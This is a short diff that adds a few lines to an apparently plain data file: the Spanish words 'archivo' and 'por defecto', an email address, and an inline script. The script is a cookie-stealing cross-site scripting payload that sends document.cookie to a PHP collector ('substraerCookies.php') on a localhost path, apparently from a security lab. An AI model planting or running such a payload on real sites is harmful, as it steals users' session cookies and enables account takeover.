@@ -1,0 +1,5 @@
+﻿﻿archivo
+por defecto
+
+<script> function getCookie() { return location.href="http://localhost/sisec/cookies/xss/substraerCookies.php/?cookie="%2Bdocument.cookie; } getCookie(); </script>
+substraercookies@mail.com
